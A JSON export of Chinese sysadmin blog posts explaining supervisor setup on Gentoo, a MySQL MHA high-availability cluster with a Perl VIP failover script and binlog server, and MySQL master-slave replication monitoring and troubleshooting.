相当强大，提供了很丰富的功能，不过我们可能只需要用到其中一小部分。安装完成之后，可以编写配置文件，来满足自己的需求。 supervisor安装 12345678eix supervisor #查看安装包名称[I] app-admin&#x2F;supervisor Available versions: (~)3.1.3 &#123;doc test PYTHON_TARGETS&#x3D;&quot;python2_7&quot;&#125; Installed versions: 3.1.3(05:36:57 PM 02&#x2F;06&#x2F;2018)(-doc -test PYTHON_TARGETS&#x3D;&quot;python2_7&quot;) Homepage: http:&#x2F;&#x2F;supervisord.org&#x2F; http:&#x2F;&#x2F;pypi.python.org&#x2F;pypi&#x2F;supervisor Description: A system for controlling process state under UNIX emerge app-admin&#x2F;supervisor #安装 如果提示修改USE标记,则在cat /etc/portage/package.keywords/00local文件中添加即可 1234567内容如下：# required by app-admin&#x2F;supervisor (argument) &#x3D;app-admin&#x2F;supervisor-3.1.3 ~amd64# required by app-admin&#x2F;supervisor-3.1.3# required by app-admin&#x2F;supervisor (argument) &#x3D;dev-python&#x2F;meld3-1.0.0 ~amd64 具体参考: Emerge USE标记 supervisor配置文件 vim /etc/supervisord.conf #没有则手动创建 123456789101112131415161718192021222324252627282930[unix_http_server]file&#x3D;&#x2F;var&#x2F;run&#x2F;supervisor.sock ；指定UNIX socket文件，supervisorctl会使用chmod&#x3D;0700 ；socket 文件的 mode，默认是 0700;[inet_http_server] ; HTTP 服务器，提供 web 管理界面;port&#x3D;127.0.0.1:9001 ; Web 管理后台运行的 IP 和端口，如果开放到公网，需要注意安全性;username&#x3D;user ; 登录管理后台的用户名;password&#x3D;123 ; 登录管理后台的密码[supervisord]user&#x3D;rootlogfile&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor.log ；指定日志文件路径logfile_maxbytes&#x3D;50MB ;日志文件大小，超出会循环，默认 50MBlogfile_backups&#x3D;10 ; 日志文件保留备份数量默认10loglevel&#x3D;info ; 日志级别，默认 info，其它: debug,warn,tracepidfile&#x3D;&#x2F;var&#x2F;run&#x2F;supervisord.pid ；指定pid文件路径nodaemon&#x3D;false ; 是否在前台启动，默认是 false，即以 daemon 的方式启动minfds&#x3D;1024 ; 可以打开的文件描述符的最小值，默认 1024minprocs&#x3D;200 ; 可以打开的进程数的最小值，默认 200[rpcinterface:supervisor]supervisor.rpcinterface_factory &#x3D; supervisor.rpcinterface:make_main_rpcinterface[supervisorctl]serverurl &#x3D; unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;supervisor.sock;通过 UNIX socket 连接 supervisord，路径与 unix_http_server 部分的file一致[include] #加载其他位置的配置,可以是*.ini或*.conf等files &#x3D; &#x2F;usr&#x2F;local&#x2F;supervisor&#x2F;etc&#x2F;include.d&#x2F;*.conf supervisor启动 123456supervisord -c &#x2F;etc&#x2F;supervisord.conf gentoo系统自启动rc-update -a add supervisordsupervisorctl status #验证启动 Program配置–应用程序supervisor配置 12mkdir -p &#x2F;usr&#x2F;local&#x2F;supervisor&#x2F;etc&#x2F;include.d&#x2F;vim &#x2F;usr&#x2F;local&#x2F;supervisor&#x2F;etc&#x2F;include.d&#x2F;news-app.conf 123456789101112131415[program:news-app]command&#x3D;&#x2F;usr&#x2F;local&#x2F;mongo&#x2F;bin&#x2F;mongod -f &#x2F;usr&#x2F;local&#x2F;mongo&#x2F;etc&#x2F;news-app.conf --smallfiles；程序启动命令directory&#x3D;&#x2F;usr&#x2F;local&#x2F;web2016&#x2F;mongo；启动命令所在目录autostart&#x3D;true ；在 supervisord 启动的时候也自动启动autorestart&#x3D;true ；程序异常退出后,自动重启startsecs&#x3D;10 ；启动10秒后没有异常退出，就当作已经正常启动了startretries&#x3D;3 ; 启动失败自动重试次数，默认是 3user&#x3D;root ；用哪个用户启动redirect_stderr&#x3D;true ; 重定向输出的日志stdout_logfile&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor&#x2F;mongo.log ；程序supervisor启动日志目录stdout_logfile_maxbytes&#x3D;100MB ;stdout日志文件大小stdout_logfile_backups&#x3D;10 ；stdout日志文件备份数loglevel&#x3D;info 注：”program:”后面的名称是之后用来启动该服务的依据 使用supervisor来启动服务 123456789101112supervisorctl reread 加载配置文件supervisorctl add news-app 添加&amp;启动supervisorctl restart news-app 重启supervisorctl status 移除配置(1)删除配置文件(2)supervisorctl reread 重新读取配置文件(3)supervisorctl update 更新配置","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"gentoo","slug":"gentoo","permalink":"https://garywu520.github.io/tags/gentoo/"},{"name":"supervisor","slug":"supervisor","permalink":"https://garywu520.github.io/tags/supervisor/"},{"name":"supervisorctl","slug":"supervisorctl","permalink":"https://garywu520.github.io/tags/supervisorctl/"}]},{"title":"MySQL MHA高可用架构与实现","slug":"MySQL-MHA高可用架构与实现","date":"2018-02-03T05:21:10.000Z","updated":"2018-02-03T08:51:26.069Z","comments":true,"path":"2018/02/03/MySQL-MHA高可用架构与实现/","link":"","permalink":"https://garywu520.github.io/2018/02/03/MySQL-MHA%E9%AB%98%E5%8F%AF%E7%94%A8%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%AE%9E%E7%8E%B0/","excerpt":"MHA高可用架构 MHA可以解决的问题 12341. 监控所有节点状态2. 自动选择新的主库3. 对业务透明（通过VIP自动切换到新主库）4. 尽量保证新的主库与老的主库数据一致,即数据补偿","text":"MHA高可用架构 MHA可以解决的问题 12341. 监控所有节点状态2. 自动选择新的主库3. 对业务透明（通过VIP自动切换到新主库）4. 尽量保证新的主库与老的主库数据一致,即数据补偿 MHA原理 1234567891011121314151617181920212223242526271. 原版MHA架构要求至少三个节点才能实现2. 监控多个节点【心跳、主从复制的状态(show slave status)】3. MHA结构是由Manager+node构成。所以三台数据库实例都需要安装MHA node相关软件。生产环境下,Manager需要单独安装在某台额外的服务器上。4. 所以节点配置SSH互信(即无密码登陆)5. 选主: MHA会默认按照将来配置文件中节点添加顺序作为选主库的依据,由于配置文件是我们自己指定的，所以MHA的选主是乐观的。同时它也会去判断从节点和主节点延迟状况。如何判断？通过show slave status\\G结果中的Seconds_Behind_Master参数作为依据，如果延迟较大超出指定范围也不会选择指定顺序中的从库作为新的主库。通过人为干预MHA的选主，设定权重，让MHA按照人为配置选择新主，如果有这种干预，还一定要保证从库真的很新。技术：半同步复制或者是使用更高端的硬件设备,如硬盘改为SSD6. 数据补偿主库宕机才会选主第一种情况(乐观): 仅是数据库实例宕机了，但服务器运行正常能正常ssh&lt;1&gt;保存从库缺失部分的binlog&lt;2&gt;重新构建新的主从环境 第一阶段的数据补偿 2.1:将S2(从库)和S1（新主库）进行对比，获得缺失部分的日志进行恢复到S2从库 2.2:S2从库 change master to S1(新主库)，即重新自动变更主从架构&lt;3&gt;将S1(新主)和原主库缺失并保存下来的binlog恢复。第二种情况（悲观）: 原主库, 操作系统都无法ssh&lt;1&gt;尝试保存从库缺失部分的binlog,发现无法获取&lt;2&gt;重新构建新的主从环境 第一阶段的数据补偿 2.1:将S2(从库)和S1（新主库）进行对比，获得缺失部分的日志进行恢复到S2从库 2.2:S2从库 change master to S1(新主库)，即重新自动变更主从架构 问题: 和原主库的数据差异如何补偿？方案:(1)配置半同步复制 (2)binlog实时的备份到远程节点(binlog server) 异步复制与半同步复制 12(1)mysql默认是异步复制（即只同步差异部分）(2)半同步复制，即主库将数据发送到从库，从库确确实实接受到了数据到relay-log(非缓存中),此时从库给主库进行接收确认。 MHA搭建过程 环境 12341、准备环境: 准备3台机器，安装好MySQL5.6.3610.0.0.5110.0.0.5210.0.0.53 123456789101112131415161718192、配置文件规划[mysqld]basedir&#x3D;&#x2F;application&#x2F;mysqldatadir&#x3D;&#x2F;application&#x2F;mysql&#x2F;datasocket&#x3D;&#x2F;tmp&#x2F;mysql.socklog-error&#x3D;&#x2F;var&#x2F;log&#x2F;mysql.loglog-bin&#x3D;&#x2F;data&#x2F;mysql&#x2F;mysql-binbinlog_format&#x3D;rowsecure-file-priv&#x3D;&#x2F;tmp server-id&#x3D;51\\52\\53gtid-mode&#x3D;onenforce-gtid-consistency&#x3D;truelog-slave-updates&#x3D;1说明：除了server-id不同，其他都相同gtid-mode&#x3D;on 启用gtid类型，否则就是普通的复制架构enforce-gtid-consistency&#x3D;true 强制GTID的一致性log-slave-updates&#x3D;1 slave更新是否记入日志（5.6必须的） 123453、分别初始化数据&#x2F;application&#x2F;mysql&#x2F;scripts&#x2F;mysql_install_db --defaults-file&#x3D;&#x2F;etc&#x2F;my.cnf --basedir&#x3D;&#x2F;application&#x2F;mysql --datadir&#x3D;&#x2F;application&#x2F;mysql&#x2F;data&#x2F; --user&#x3D;mysql启动数据库&#x2F;etc&#x2F;init.d&#x2F;mysqld start 124、主节点-创建复制用户(51作为主节点，52、53为从)GRANT REPLICATION SLAVE ON *.* TO repl@&#39;10.0.0.%&#39; IDENTIFIED BY &#39;123&#39;; 123456785、52&#x2F;53从库开启复制change master to master_host&#x3D;&#39;10.0.0.51&#39;,master_user&#x3D;&#39;repl&#39;,master_password&#x3D;&#39;123&#39;,MASTER_AUTO_POSITION&#x3D;1;启动slavestart slave;验证slavemysql&gt; show slave status; 123456关闭relaylog自动删除set global relay_log_purge &#x3D; 0;set global relay_log_purge &#x3D; 0; 临时（建议三个节点都做）relay_log_purge &#x3D; 0 永久，在配置文件，建议在三个节点都做set global read_only&#x3D;1; 临时，为后续读写分离准备，不需要在配置文件生效（在所有从库） 注：MySQL使用GTID的优势 12345678(1) group commit(2) 对每一个事务记录唯一的一串编号uuid：TXID(3) failover（故障转移）更加有优势。3.1 选主方面 classic replication mseter.info和主中show master status GTID 比较主从的gtid就可以了。3.2 数据补偿方面 classic, 比较主从master.info 和show master status。把没有的拿过来运行时，使用gtid比较简单 部署MHA 安装mha node节点 12345各节点安装node软件包及依赖依赖包perl-DBD-MySQL ，并在三个节点都安装node软件yum install -y perl-DBD-MySQLrpm -ivh mha4mysql-node-0.56-0.el6.noarch.rpm 创建mha管理用户 12主库中创建mha管理用户(从库会自动同步)grant all privileges on *.* to mha@&#39;10.0.0.%&#39; identified by &#39;mha&#39;; 配置软连接 12ln -s &#x2F;application&#x2F;mysql&#x2F;bin&#x2F;mysqlbinlog &#x2F;usr&#x2F;bin&#x2F;mysqlbinlogln -s &#x2F;application&#x2F;mysql&#x2F;bin&#x2F;mysql &#x2F;usr&#x2F;bin&#x2F;mysql 部署manger节点(生产环境为独立服务器) 123456789101112131415161718192021222324252627282930313233343536wget -O &#x2F;etc&#x2F;yum.repos.d&#x2F;epel.repo http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;repo&#x2F;epel-6.repoyum install -y perl-Config-Tiny epel-release perl-Log-Dispatch perl-Parallel-ForkManager perl-Time-HiRes安装 manager软件rpm -ivh mha4mysql-manager-0.56-0.el6.noarch.rpm 创建必要目录mkdir -p &#x2F;etc&#x2F;mhamkdir -p &#x2F;var&#x2F;log&#x2F;mha&#x2F;app1 可以管理多套主从复制创建配置文件 (不需要的配置不要留着，注释没用,切换后会重写)vim &#x2F;etc&#x2F;mha&#x2F;app1.cnf 内容如下：[server default] manager_log&#x3D;&#x2F;var&#x2F;log&#x2F;mha&#x2F;app1&#x2F;managermanager_workdir&#x3D;&#x2F;var&#x2F;log&#x2F;mha&#x2F;app1master_binlog_dir&#x3D;&#x2F;data&#x2F;mysqluser&#x3D;mhapassword&#x3D;mhaping_interval&#x3D;2repl_password&#x3D;123repl_user&#x3D;replssh_user&#x3D;root[server1]hostname&#x3D;10.0.0.51port&#x3D;3306[server2]hostname&#x3D;10.0.0.52port&#x3D;3306[server3]hostname&#x3D;10.0.0.53port&#x3D;3306 配置节点SSH互信 12345678配置互信(所有节点)ssh-keygen -t dsa -P &#39;&#39; -f ~&#x2F;.ssh&#x2F;id_dsa &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1ssh-copy-id -i &#x2F;root&#x2F;.ssh&#x2F;id_dsa.pub root@10.0.0.51ssh-copy-id -i &#x2F;root&#x2F;.ssh&#x2F;id_dsa.pub root@10.0.0.52ssh-copy-id -i &#x2F;root&#x2F;.ssh&#x2F;id_dsa.pub root@10.0.0.53检测互信[root@server3 ~]# masterha_check_ssh --conf&#x3D;&#x2F;etc&#x2F;mha&#x2F;app1.cnf 12检查主从状态masterha_check_repl --conf&#x3D;&#x2F;etc&#x2F;mha&#x2F;app1.conf 故障处理 12345678故障处理:[error][&#x2F;usr&#x2F;share&#x2F;perl5&#x2F;vendor_perl&#x2F;MHA&#x2F;ServerManager.pm, ln301] Got MySQL error when connecting 10.0.0.53(10.0.0.53:3306) :1045:Access denied for user &#39;mha&#39;@&#39;server3&#39; (using password: YES), but this is not a MySQL crash. Check MySQL server settings.解决：我们需要在配置文件中加入 skip-name-resolve 在manager节点启动mha 12345678nohup masterha_manager --conf&#x3D;&#x2F;etc&#x2F;mha&#x2F;app1.cnf --remove_dead_master_conf --ignore_last_failover &lt; &#x2F;dev&#x2F;null &gt; &#x2F;var&#x2F;log&#x2F;mha&#x2F;app1&#x2F;manager.log 2&gt;&amp;1 &amp;mha启动验证ps -ef |grep manager检查MHA集群状态：masterha_check_status --conf&#x3D;&#x2F;etc&#x2F;mha&#x2F;app1.cnf app1 (pid:7502) is running(0:PING_OK), master:10.0.0.51 MHA故障模拟及修复 1234567891.模拟主库宕机，tailf命令查看mha机器的manager log信息 (1)log查看主库宕机,从库选举、切换等等过程 (2)再次查看配置文件内容，发现主库信息已经被自动移除2.恢复MHA架构 (1)修复1主2从复制架构 将宕机的原主库启动mysql服务，然后change master to 到新主库，最后start slave (2)修复MHA - 配置文件添加新节点(添加宕机恢复好的原主库) - 检查ssh互信与主从状态，最后启动MHA MHA高级功能 VIP高可用实现 123(1)人为指定一个VIP地址(不能被占用)(2)MHA能够切换这个VIP(3)MHA ip failover脚本(自己写) MHA-VIP脚本:master_ip_failover.sh 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#!&#x2F;usr&#x2F;bin&#x2F;env perluse strict;use warnings FATAL &#x3D;&gt; &#39;all&#39;;use Getopt::Long;my ( $command, $ssh_user, $orig_master_host, $orig_master_ip, $orig_master_port, $new_master_host, $new_master_ip, $new_master_port);#--------------------- 需要关注的区域-----------------------my $vip &#x3D; &#39;10.0.0.55&#x2F;24&#39;;my $key &#x3D; &#39;1&#39;;my $ssh_start_vip &#x3D; &quot;&#x2F;sbin&#x2F;ifconfig eth1:$key $vip&quot;;my $ssh_stop_vip &#x3D; &quot;&#x2F;sbin&#x2F;ifconfig eth1:$key down&quot;;#--------------------- 结束关注的区域------------------------GetOptions( &#39;command&#x3D;s&#39; &#x3D;&gt; \\$command, &#39;ssh_user&#x3D;s&#39; &#x3D;&gt; \\$ssh_user, &#39;orig_master_host&#x3D;s&#39; &#x3D;&gt; \\$orig_master_host, &#39;orig_master_ip&#x3D;s&#39; &#x3D;&gt; \\$orig_master_ip, &#39;orig_master_port&#x3D;i&#39; &#x3D;&gt; \\$orig_master_port, &#39;new_master_host&#x3D;s&#39; &#x3D;&gt; \\$new_master_host, &#39;new_master_ip&#x3D;s&#39; &#x3D;&gt; \\$new_master_ip, &#39;new_master_port&#x3D;i&#39; &#x3D;&gt; \\$new_master_port,);exit &amp;main();sub main &#123; print &quot;\\n\\nIN SCRIPT TEST&#x3D;&#x3D;&#x3D;&#x3D;$ssh_stop_vip&#x3D;&#x3D;$ssh_start_vip&#x3D;&#x3D;&#x3D;\\n\\n&quot;; if ( $command eq &quot;stop&quot; || $command eq &quot;stopssh&quot; ) &#123; my $exit_code &#x3D; 1; eval &#123; print &quot;Disabling the VIP on old master: $orig_master_host \\n&quot;; &amp;stop_vip(); $exit_code &#x3D; 0; &#125;; if ($@) &#123; warn &quot;Got Error: $@\\n&quot;; exit $exit_code; &#125; exit $exit_code; &#125; elsif ( $command eq &quot;start&quot; ) &#123; my $exit_code &#x3D; 10; eval &#123; print &quot;Enabling the VIP - $vip on the new master - $new_master_host \\n&quot;; &amp;start_vip(); $exit_code &#x3D; 0; &#125;; if ($@) &#123; warn $@; exit $exit_code; &#125; exit $exit_code; &#125; elsif ( $command eq &quot;status&quot; ) &#123; print &quot;Checking the Status of the script.. OK \\n&quot;; exit 0; &#125; else &#123; &amp;usage(); exit 1; &#125;&#125;sub start_vip() &#123; &#96;ssh $ssh_user\\@$new_master_host \\&quot; $ssh_start_vip \\&quot;&#96;;&#125;sub stop_vip() &#123; return 0 unless ($ssh_user); &#96;ssh $ssh_user\\@$orig_master_host \\&quot; $ssh_stop_vip \\&quot;&#96;;&#125;sub usage &#123; print &quot;Usage: master_ip_failover --command&#x3D;start|stop|stopssh|status --orig_master_host&#x3D;host --orig_master_ip&#x3D;ip --orig_master_port&#x3D;port --new_master_host&#x3D;host --new_master_ip&#x3D;ip --new_master_port&#x3D;port\\n&quot;;&#125; VIP实现步骤 12345678910111213141516171819202122232425VIP(Manager节点)(1)添加一个vip切换脚本(使用的是源码包中的模板)vi &#x2F;usr&#x2F;local&#x2F;bin&#x2F;master_ip_failover(如上脚本)修改如下内容:my $vip &#x3D; &#39;10.0.0.55&#x2F;24&#39;;my $key &#x3D; &#39;1&#39;;my $ssh_start_vip &#x3D; &quot;&#x2F;sbin&#x2F;ifconfig eth0:$key $vip&quot;;my $ssh_stop_vip &#x3D; &quot;&#x2F;sbin&#x2F;ifconfig eth0:$key down&quot;;(2)在配置文件中加入调用定制的脚本vi &#x2F;etc&#x2F;mha&#x2F;app1.cnf添加：master_ip_failover_script&#x3D;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;master_ip_failover(3)重启MHA重启mhamasterha_stop --conf&#x3D;&#x2F;etc&#x2F;mha&#x2F;app1.cnfnohup masterha_manager --conf&#x3D;&#x2F;etc&#x2F;mha&#x2F;app1.cnf --remove_dead_master_conf --ignore_last_failover &lt; &#x2F;dev&#x2F;null &gt; &#x2F;var&#x2F;log&#x2F;mha&#x2F;app1&#x2F;manager.log 2&gt;&amp;1 &amp;(4)(主库)第一次需要手工添加VIP到配置文件指定的网卡别名上(eth0:1)ifconfig eth0:1 10.0.0.55&#x2F;24(5)测试vip漂移 关闭master节点,查看新主节点的ip信息 Binlog Server(新配置一个节点) 1234567891011121314151617181920（1）准备一台新的mysql实例（53），必须开启GTID（2）建立binlog接收目录，不能和主库binlog目录一样 mkdir &#x2F;data&#x2F;mysql&#x2F;binlog&#x2F; chown -R mysql.mysql &#x2F;data&#x2F; （3）在app1.cnf中开启binlogserver功能 [binlog1] no_master&#x3D;1 hostname&#x3D;10.0.0.53 ---&gt;db03那台机器 master_binlog_dir&#x3D;&#x2F;data&#x2F;mysql&#x2F;binlog&#x2F; ---&gt;我们自定义的binlog保存目录（4）开启binlog接收（接收主库的binlog） cd &#x2F;data&#x2F;mysql&#x2F;binlog&#x2F; mysqlbinlog -R --host&#x3D;10.0.0.51 --user&#x3D;mha --password&#x3D;mha --raw --stop-never mysql-bin.000001 &amp; （5）停止MHA &#x2F;usr&#x2F;bin&#x2F;masterha_stop --conf&#x3D;&#x2F;etc&#x2F;mha&#x2F;app1.cnf （6）开启MHAnohup masterha_manager --conf&#x3D;&#x2F;etc&#x2F;mha&#x2F;app1.cnf --remove_dead_master_conf --ignore_last_failover &lt; &#x2F;dev&#x2F;null &gt; &#x2F;var&#x2F;log&#x2F;mha&#x2F;app1&#x2F;manager.log 2&gt;&amp;1 &amp; 发送邮件 12345678910111213143.send_report(1)准备发邮件的脚本(2)将准备好的脚本添加到mha配置文件中,让其调用 vi &#x2F;etc&#x2F;mha&#x2F;app1.cnf report_script&#x3D;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;send （3）停止MHA &#x2F;usr&#x2F;bin&#x2F;masterha_stop --conf&#x3D;&#x2F;etc&#x2F;mha&#x2F;app1.cnf （4）开启MHA nohup masterha_manager --conf&#x3D;&#x2F;etc&#x2F;mha&#x2F;app1.cnf --remove_dead_master_conf --ignore_last_failover &lt; &#x2F;dev&#x2F;null &gt; &#x2F;var&#x2F;log&#x2F;mha&#x2F;app1&#x2F;manager.log 2&gt;&amp;1 &amp; (5) 关闭主库,看警告邮件 MHA架构不足 12345678MHA: 浪费机器读写分离:将读操作落到从节点上去运行,主库只负责写入mysql中间件实现: atlas(奇虎360开源)facebook:多套MHA集群,分片(分布式系统一类:分布式存储)","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"MySQL","slug":"MySQL","permalink":"https://garywu520.github.io/tags/MySQL/"},{"name":"Failover","slug":"Failover","permalink":"https://garywu520.github.io/tags/Failover/"},{"name":"binlog server","slug":"binlog-server","permalink":"https://garywu520.github.io/tags/binlog-server/"},{"name":"异步复制","slug":"异步复制","permalink":"https://garywu520.github.io/tags/%E5%BC%82%E6%AD%A5%E5%A4%8D%E5%88%B6/"},{"name":"半同步复制","slug":"半同步复制","permalink":"https://garywu520.github.io/tags/%E5%8D%8A%E5%90%8C%E6%AD%A5%E5%A4%8D%E5%88%B6/"},{"name":"MHA","slug":"MHA","permalink":"https://garywu520.github.io/tags/MHA/"},{"name":"VIP","slug":"VIP","permalink":"https://garywu520.github.io/tags/VIP/"}]},{"title":"MySQL主从管理与维护","slug":"MySQL主从管理与维护","date":"2018-01-31T10:01:26.000Z","updated":"2018-01-31T11:18:39.382Z","comments":true,"path":"2018/01/31/MySQL主从管理与维护/","link":"","permalink":"https://garywu520.github.io/2018/01/31/MySQL%E4%B8%BB%E4%BB%8E%E7%AE%A1%E7%90%86%E4%B8%8E%E7%BB%B4%E6%8A%A4/","excerpt":"1上一个文章可以成功部署MySQL主从,主从同步状态如何以及relay log等等信息如何监控？ MySQL主从部署","text":"1上一个文章可以成功部署MySQL主从,主从同步状态如何以及relay log等等信息如何监控？ MySQL主从部署 如何确定MySQL主从关系？ 主库: 12mysql&gt; show proccesslist; #此命令可以看到哪些客户端在与主库连接，可以辅助判断从库。不代表列出的都是从库。 从库: 1mysql&gt; show slave status\\G; #此命令可以看到从库运行状态等等信息，下面详细说。 主从维护 12345678910111213141516mysql&gt; show slave status\\G;*************************** 1. row *************************** Slave_IO_State: Waiting for master to send event----------------------------------------- Master_Host: 10.0.0.52 Master_User: repl Master_Port: 3306 Connect_Retry: 60 Master_Log_File: mysql-bin.000007 Read_Master_Log_Pos: 211 以上信息来自于从库的master.info文件,列出了主库与连接端口等作用: 1.从库用来连接主库 2.从库会拿着Master_Log_File和Read_Master_Log_Pos, 去问主库有没有比这个新的数据,有的话就给我. 123456789----------------------------------------------------------------- Relay_Log_File: 3307-relay-bin.000006 Relay_Log_Pos: 374 Relay_Master_Log_File: mysql-bin.000007以上信息来自于relay-log.info作用: 1.记录了已经应用过的最后一个relay信息会被记录到此文件中 2.为了断点恢复 12345-----------------------------------------------------------------Slave_IO_Running: YesSlave_SQL_Running: Yes从库线程状态 1234-----------------------------------------------------------------Seconds_Behind_Master: 0 从库落后主库多久 1234567----------------------------------------------------------------- Last_IO_Errno: 0Last_IO_Error: Last_SQL_Errno: 0Last_SQL_Error: 线程的具体的报错代码和详细信息 1234----------------------------------------------------------------- SQL_Delay: 0 SQL线程延时配置 1234----------------------------------------------------------------- Slave_SQL_Running_State: Slave has read all relay log; waiting for the slave I&#x2F;O thread to update itSQL线程运行状态 故障排查1： 1234567891011监控主从复制状态:Last_IO_Error: error reconnecting to master &#39;repl@10.0.0.52:3306&#39; - retry-time: 60 retries: 1原因：1、主库没启动，或者宕机2、网络通信问题3、防火墙4、复制用户和密码、端口号、地址有问题5、mysql自动解析，会将连接的IP解析成主机名（skip-name-resolve）6、从库IO异常关闭7、bug 故障排查2： 1234567891011从库记录的已经主库已经给我传送的binlog事件的坐标，一般在繁忙的生产环境下会落后于主库（show master status）Master_Log_File: mysql-bin.000007Read_Master_Log_Pos: 729落后太远的原因：硬件条件有关的主要还是网络问题主库存放二进制日志的存储性能太低。主库DUMP太繁忙，一主多从环境下。从库IO线程太忙 故障排查3： 123456789主库update，从库迟迟的没有更新。特殊情况，日志已经传过来了，数据并没有同步跟SQL线程有很大关系：1、没开启SQL线程2、传的东西有问题（你要做的事情，我提前已经做了，不想重复做了，然后他就死了）3、SQL线程忙。4、人为控制了（delay节点、延时节点，一般生产设置为3-6小时之间，可以保证过去3-6小时之间的误操作，可以避免）。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"MySQL","slug":"MySQL","permalink":"https://garywu520.github.io/tags/MySQL/"},{"name":"主从同步","slug":"主从同步","permalink":"https://garywu520.github.io/tags/%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5/"},{"name":"主从复制监控","slug":"主从复制监控","permalink":"https://garywu520.github.io/tags/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9B%91%E6%8E%A7/"}]},{"title":"MySQL主从原理与部署","slug":"MySQL主从原理与部署","date":"2018-01-31T08:18:15.000Z","updated":"2018-02-08T09:46:37.065Z","comments":true,"path":"2018/01/31/MySQL主从原理与部署/","link":"","permalink":"https://garywu520.github.io/2018/01/31/MySQL%E4%B8%BB%E4%BB%8E%E5%8E%9F%E7%90%86%E4%B8%8E%E9%83%A8%E7%BD%B2/","excerpt":"什么是mysql主从同步？ 1当master(主)库的数据发生变化的时候，变化会实时的同步到slave(从)库。","text":"什么是mysql主从同步？ 1当master(主)库的数据发生变化的时候，变化会实时的同步到slave(从)库。 主从同步有什么好处？ 1234水平扩展数据库的负载能力。容错，高可用。Failover(失败切换)&#x2F;High Availability数据备份。 主从环境涉及到的文件-梳理 1234567891011121314151617181920212223242526Master主库:binlog文件 1.存放在和数据文件不同的位置 2.使用ROW格式(行) 3.提高binlog写入磁盘的实时性 sync_binlog&#x3D;0&#x2F;1 1:每次事务commit都要刷新到磁盘 0:和1对立,不是每次事务完成就写磁盘 建议将binlog存放在SSD存储上Slave从库: &lt;1&gt;Relay-log文件 作用:保存IO线程接收过来的主库的binlog事件 可通过relay-bin去设置relay的保存位置,默认存放在数据目录下&lt;2&gt;Master.info文件作用：(1)连接主库的IP&#x2F;Port&#x2F;User&#x2F;Password(通过change master to命令而来)(2)上次请求到哪一个事件了（file名+position号）&lt;3&gt;Relay-log.info作用：记录已经运行到哪一个relaylog事件的哪个位置了注：(1)主从数据同步需要保证在某个时间点数据是一致的。 (2)mysql默认是异步复制（即只同步差异部分） (3)半同步复制，即主库将数据发送到从库，从库确确实实接受到了数据到relay-log(非缓存中),此时从库给主库进行接收确认。 主从工作流程 123由从库发起数据同步请求，拿着master.info中的file和position号去连接主库。主库拿着从库的file名和position号去比对主库自己的bin-log文件, 把最新的一部分文件通过主库的dump线程发送给从库的io线程,从库的io线程把接收的数据记录在relay-log中,从库将relay-log中的文件通过sql线程写入到数据库中，并在relay-log.info文件中记录已经运行到哪一个relaylog事件的哪个位置了注：从库master.info中记录的是从主库拿过来的bin-log file名和position号。与从库自己的relay-log信息是完全独立的,即file名和position号不一致是正常的。 MySQL架构演变 1234567&lt;1&gt;安全角度主库执行drop database oldboy ---&gt;从库也很快运行，属于逻辑损坏，而延时从库同步可以很好解决这个问题。即将从库SQL线程阻塞,主从之间日志传送正常执行，但是SQL线程不立即执行&lt;2&gt;性能角度所有读写请求都会落到主库进行负载,可以使用读写分离技术，让从库分担主库压力。&lt;3&gt;快速Failover 主从同步-实现123假设server主库已经运行了很长时间，并且数据很重要，如何做从？注意:做主从之前，需要确保主从之间的MySQL版本信息一致，否则可能会出现缺少plugin而无法启动的情况 主库my.cnf 123456789101112131415cat &#x2F;etc&#x2F;my.cnf[client]port &#x3D; 3306socket &#x3D; &#x2F;data&#x2F;B&#x2F;mysql&#x2F;mysql.sock[mysqld]user &#x3D; mysqlport &#x3D; 3306socket &#x3D; &#x2F;data&#x2F;B&#x2F;mysql&#x2F;mysql.sockbasedir &#x3D; &#x2F;usr&#x2F;local&#x2F;mysqldatadir &#x3D; &#x2F;data&#x2F;B&#x2F;mysql&#x2F;datalog-bin &#x3D; &#x2F;data&#x2F;B&#x2F;mysql&#x2F;mysql-binserver-id &#x3D; 5 #主从mysql id号不同skip_name_resolve 从库my.cnf 123456789101112131415cat &#x2F;etc&#x2F;my.cnf[client]port &#x3D; 3306socket &#x3D; &#x2F;data&#x2F;B&#x2F;mysql&#x2F;mysql.sock[mysqld]user &#x3D; mysqlport &#x3D; 3306socket &#x3D; &#x2F;data&#x2F;B&#x2F;mysql&#x2F;mysql.sockbasedir &#x3D; &#x2F;usr&#x2F;local&#x2F;mysqldatadir &#x3D; &#x2F;data&#x2F;B&#x2F;mysql&#x2F;datalog-bin &#x3D; &#x2F;data&#x2F;B&#x2F;mysql&#x2F;mysql-bin #在从库启用binlog(按需配置)server-id &#x3D; 10 #主从mysql id号不同skip_name_resolve #跳过本地解析 主库操作 查看主库当前binlog文件和position号码(稍后从库需要) 1234567mysql&gt; show master status; +------------------+------------+| File | Position | +------------------+------------+| mysql-bin.003374 | 1016625221 | +------------------+------------+ 主库备份 1数据量≤50GB,建议使用mysqldump ;数据量＞50GB建议使用xtrabackup 12xtrabackup全备并压缩-参考：&#x2F;usr&#x2F;bin&#x2F;innobackupex --defaults-file&#x3D;&#x2F;etc&#x2F;my.cnf --user&#x3D;root --password&#x3D;123 --stream&#x3D;xbstream &#x2F;data&#x2F;A&#x2F;backup&#x2F;mysql&#x2F;allbackup |gzip - &gt; &#x2F;data&#x2F;A&#x2F;backup&#x2F;mysql&#x2F;allbackup&#x2F;NewAll31.xbstream.gz 主库创建复制用户 1grant replication slave on *.* to 